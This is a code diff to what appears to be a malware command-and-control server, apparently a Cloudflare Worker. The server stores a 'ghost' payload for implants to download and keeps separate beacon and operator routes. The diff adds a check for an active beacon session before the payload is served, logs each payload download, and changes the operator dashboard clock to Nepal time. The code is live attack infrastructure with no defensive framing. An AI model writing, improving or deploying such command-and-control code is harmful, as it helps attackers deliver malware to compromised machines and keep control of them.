@@ -606,9 +606,24 @@ async function handleUploadPayload(request: Request, env: Env): Promise<Response
   return jsonResponse({ status: "ok", bytes: body.byteLength });
 }
 
-async function handleDownloadPayload(env: Env): Promise<Response> {
+async function handleDownloadPayload(request: Request, env: Env): Promise<Response> {
+  // Implant must have an active beacon session — token alone is not enough
+  const sid = request.headers.get("X-Session-ID") ?? "";
+  if (!sid) return errorResponse("Missing session", 400);
+
+  const session = await getSession(env.GHOST_KV, clamp(sid, MAX_SESSION_LEN));
+  if (!session) return errorResponse("Unauthorized", 401);
+
   const raw = await env.GHOST_KV.get("payload:ghost", { type: "arrayBuffer" });
   if (!raw) return errorResponse("Payload not found", 404);
+
+  await logAudit(env.GHOST_KV, {
+    ts: now(),
+    ip: getClientIP(request),
+    action: "payload_downloaded",
+    detail: { sid: session.session },
+  });
+
   return new Response(raw, {
     status: 200,
     headers: {
@@ -959,7 +974,12 @@ header::after{content:'';position:absolute;bottom:-1px;left:0;right:0;height:1px
   let lastResultCount = 0, lastBeaconTs = null;
 
   function tick() {
-    document.getElementById('clock').textContent = new Date().toISOString().replace('T',' ').slice(0,19)+' UTC';
+    const s = new Date().toLocaleString('en-US', {
+      timeZone: 'Asia/Kathmandu', hour12: true,
+      month: 'short', day: '2-digit', year: 'numeric',
+      hour: 'numeric', minute: '2-digit', second: '2-digit'
+    });
+    document.getElementById('clock').textContent = s + ' NPT';
   }
   tick(); setInterval(tick, 1000);
 
@@ -1294,7 +1314,7 @@ async function handleRequest(request: Request, env: Env): Promise<Response> {
   if (path === "/payload" && method === "GET") {
     const authErr = requireBeaconToken(request, env);
     if (authErr) return withCORS(authErr, env);
-    return withCORS(await handleDownloadPayload(env), env);
+    return withCORS(await handleDownloadPayload(request, env), env);
   }
 
   // ── Operator routes (X-Operator-Token) ────────
